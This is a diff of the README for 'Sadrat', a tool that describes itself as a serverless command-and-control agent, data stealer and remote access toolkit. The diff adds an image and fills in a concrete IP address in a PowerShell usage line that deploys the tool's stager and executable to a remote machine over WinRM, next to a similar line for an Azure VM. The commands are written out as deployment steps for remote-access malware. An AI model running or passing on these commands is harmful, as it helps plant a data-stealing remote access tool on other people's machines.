@@ -1,5 +1,8 @@
 ## Sadrat
 
+![Sadrat Hacker](sadrat.webp)
+
+
 ### Serverless C2 Agent, Datastealer and Remote Access Toolkit
 
 #### Stagers
@@ -47,7 +50,7 @@ $scriptPath = ".\Stager.ps1"
 .\azSadrat.ps1 -az -url $url -zipName $zipName -exeName $exeName -vmName $vmName -resourceGroup $rg -scriptPath $scriptPath
 
 # winRm
-$Ip = ''
+$Ip = '52.170.147.27'
 .\azSadrat.ps1 -winrm -url $url -zipName $zipName -exeName $exeName -vmName $Ip -scriptPath $scriptPath
 
 ```
